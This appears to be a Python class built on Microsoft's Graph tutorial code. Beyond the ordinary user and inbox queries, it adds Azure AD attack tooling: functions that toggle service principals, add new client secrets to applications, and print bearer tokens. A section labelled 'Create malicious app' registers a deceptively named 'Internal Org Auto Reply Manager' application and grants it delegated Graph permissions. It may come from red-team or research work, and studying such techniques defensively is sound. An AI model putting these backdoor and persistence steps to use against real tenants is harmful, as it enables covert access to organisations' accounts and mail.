import json
from configparser import SectionProxy
from azure.identity import DeviceCodeCredential, ClientSecretCredential
from msgraph.core import GraphClient

class Graph:
    settings: SectionProxy
    device_code_credential: DeviceCodeCredential
    user_client: GraphClient
    client_credential: ClientSecretCredential
    app_client: GraphClient

    def __init__(self, config: SectionProxy):
        self.settings = config
        client_id = self.settings['clientId']
        tenant_id = self.settings['tenantId']
        graph_scopes = self.settings['graphUserScopes'].split(' ')

        self.device_code_credential = DeviceCodeCredential(client_id, tenant_id = tenant_id)
        self.user_client = GraphClient(credential=self.device_code_credential, scopes=graph_scopes)


    def get_user_token(self):
        graph_scopes = self.settings['graphUserScopes']
        access_token = self.device_code_credential.get_token(graph_scopes)
        return access_token.token

    def get_user(self):
        endpoint = '/me'
        # Only request specific properties
        select = 'displayName,mail,userPrincipalName'
        request_url = f'{endpoint}?$select={select}'
        print(request_url)
        user_response = self.user_client.get(request_url)
        print(user_response)
        return user_response.json()

    def get_inbox(self):
        endpoint = '/me/mailFolders/inbox/messages'
        # Only request specific properties
        select = 'from,isRead,receivedDateTime,subject'
        # Get at most 25 results
        top = 25
        # Sort by received time, newest first
        order_by = 'receivedDateTime DESC'
        request_url = f'{endpoint}?$select={select}&$top={top}&$orderBy={order_by}'

        inbox_response = self.user_client.get(request_url)
        return inbox_response.json()

    def ensure_graph_for_app_only_auth(self):
        if not hasattr(self, 'client_credential'):
            client_id = self.settings['clientId']
            tenant_id = self.settings['tenantId']
            client_secret = self.settings['clientSecret']

            self.client_credential = ClientSecretCredential(tenant_id, client_id, client_secret)

        if not hasattr(self, 'app_client'):
            self.app_client = GraphClient(credential=self.client_credential,
                                          scopes=['https://graph.microsoft.com/.default'])

    def get_users(self):
        self.ensure_graph_for_app_only_auth()

        endpoint = '/users'
        # Only request specific properties
        select = 'displayName,id,mail'
        # Get at most 25 results
        top = 25
        # Sort by display name
        order_by = 'displayName'
        request_url = f'{endpoint}?$select={select}&$top={top}&$orderBy={order_by}'

        users_response = self.app_client.get(request_url)
        return users_response.json()

    # pylint: disable-next=no-self-use
    def get_apps(self):
        # INSERT YOUR CODE HERE
        # Note: if using app_client, be sure to call
        # ensure_graph_for_app_only_auth before using it
        # self.ensure_graph_for_app_only_auth()

        endpoint = '/applications'

        search = "displayName:Microsoft Graph api"
        request_url = f'{endpoint}?$search="{search}"'
        print(request_url)
        list_response = self.user_client.get(request_url, headers={'ConsistencyLevel': 'eventual'})
        return list_response.json()

    def get_servicePrincipals(self):
        # INSERT YOUR CODE HERE
        # Note: if using app_client, be sure to call
        # ensure_graph_for_app_only_auth before using it
        # self.ensure_graph_for_app_only_auth()

        endpoint = '/servicePrincipals'
        # Only request specific properties
        select = 'id,accountEnabled,appDisplayName,appId'

        request_url = f'{endpoint}?$select={select}'
        print(request_url)
        list_response = self.user_client.get(request_url)
        return list_response.json()

# pylint: disable-next=no-self-use
#      def get_app(self):
#         # INSERT YOUR CODE HERE
#         # Note: if using app_client, be sure to call
#         # ensure_graph_for_app_only_auth before using it
#         # self.ensure_graph_for_app_only_auth()
#
#        # endpoint = '/applications'
#         endpoint = '/servicePrincipals'
#         # Only request specific properties
#         search = 'displayName:Sales'
#         request_url = f'{endpoint}?$search="{search}"&$count=true ' \
#
#
#         found_app = self.user_client.get(request_url , headers={'ConsistencyLevel': 'eventual'})
#
#
#
#         return found_app.json()

    def get_app(self, app_name = "Microsoft Graph"):
        # INSERT YOUR CODE HERE
        # Note: if using app_client, be sure to call
        # ensure_graph_for_app_only_auth before using it
        # self.ensure_graph_for_app_only_auth()

       # endpoint = '/applications'
        endpoint = '/servicePrincipals'
        # Only request specific properties
        search = f'displayName:{app_name}'
        request_url = f'{endpoint}?$search="{search}"&$count=true '


        found_app = self.user_client.get(request_url , headers={'ConsistencyLevel': 'eventual'})



        return found_app.json()



    def enable_app(self,to_enable,token):
        #salesforce app id

        id = "d91c67c6-9b31-47f5-901f-10da33a51567"
        # id id = "ab220987-a982-4b6a-9c3b-f07f233f4bf8"
        #id = "2942ffee-ad11-458b-95a9-242e361aafa4"
        #id = '53857935-7373-49af-b209-497f13dc8493'
        request_url = f'/servicePrincipals/{id}'


        if to_enable:
            accountEnabled = 'true'
        else:
            accountEnabled = 'false'
        body = {  'accountEnabled' : f'{accountEnabled}'}

     #   print(request_url)
     #   print(body)
     #   print({'Authorization': f'Bearer {token}'
     #          ,'Content-Type': 'application/json'})
        enabled_app = self.user_client.patch(request_url,
                                                 data=json.dumps(body),
                                                 headers={'Authorization': f'Bearer {token}'
                                                     ,'Content-Type': 'application/json'})
        print(enabled_app)
        return enabled_app


    def get_app_keys(self):
        # salesforce app id from seearch
        id = "460a567d-f226-4836-b929-0a4a83427177"


        request_url = f'/applications/{id}?$select=keyCredentials'
        print(request_url)
        keys = self.user_client.get(request_url, headers={'ConsistencyLevel': 'eventual'})
        print(keys)
        return keys.json()

    def add_password(self, token, id="00000003-0000-0000-c000-000000000000" ):
        #                             "460a567d-f226-4836-b929-0a4a83427177"):
        # salesforce app id from seearch

        # id = "232b2e58-7e6e-4567-bef0-eff5a2bd5b73"
        # sales force service principal id = "ab220987-a982-4b6a-9c3b-f07f233f4bf8"
        # id = "2942ffee-ad11-458b-95a9-242e361aafa4"
        # id = '53857935-7373-49af-b209-497f13dc8493'
        request_url = f'/applications/{id}/addPassword'

        body = {'displayName': 'my password'}

        print(request_url)
        print(body)
        print({'Authorization': f'Bearer {token}'
                  , 'Content-Type': 'application/json'})
        added_password = self.user_client.post(request_url,
                                               data=json.dumps(body),
                                               headers={'Authorization': f'Bearer {token}'
                                                   , 'Content-Type': 'application/json'})
        print(added_password)
        return added_password.json()



    ####   Create malicious app
    def create_app(self,token):
        request_url = "/applications"
        body = { "displayName": "Internal Org Auto Reply Manager Single tenant "
                 , "web": {
                    "redirectUris": ["http://localhost:8400/"]
                                }
                  }
        print(request_url)
        response = self.user_client.post(request_url,
                                         data=json.dumps(body),
                                                 headers={'Authorization': f'Bearer {token}'
                                                 , 'Content-Type': 'application/json'})
        return response.json()


    def add_app_permissions(self,token ,id = '4f09b599-964d-4168-b80f-78d8589ffdf0'):
        request_url = f'/applications/{id}'
        body = {
                          "requiredResourceAccess": [
                    {
                        "resourceAppId": "00000003-0000-0000-c000-000000000000",
                        "resourceAccess": [
                            {
                                "id": "570282fd-fa5c-430d-a7fd-fc8dc98a9dca",
                                "type": "Scope"
                            },
                            {
                                "id": "818c620a-27a9-40bd-a6a5-d96f7d610b4b",
                                "type": "Scope"
                            }
                        ]
                    }
                  ],"signInAudience": "AzureADMyOrg"
            }


        print(request_url)
        response = self.user_client.patch(request_url,
                                         data=json.dumps(body),
                                                 headers={'Authorization': f'Bearer {token}'
                                                 , 'Content-Type': 'application/json'})
        try:
              response = response.json()
        except:
               print( "Response is not a json")

        return response




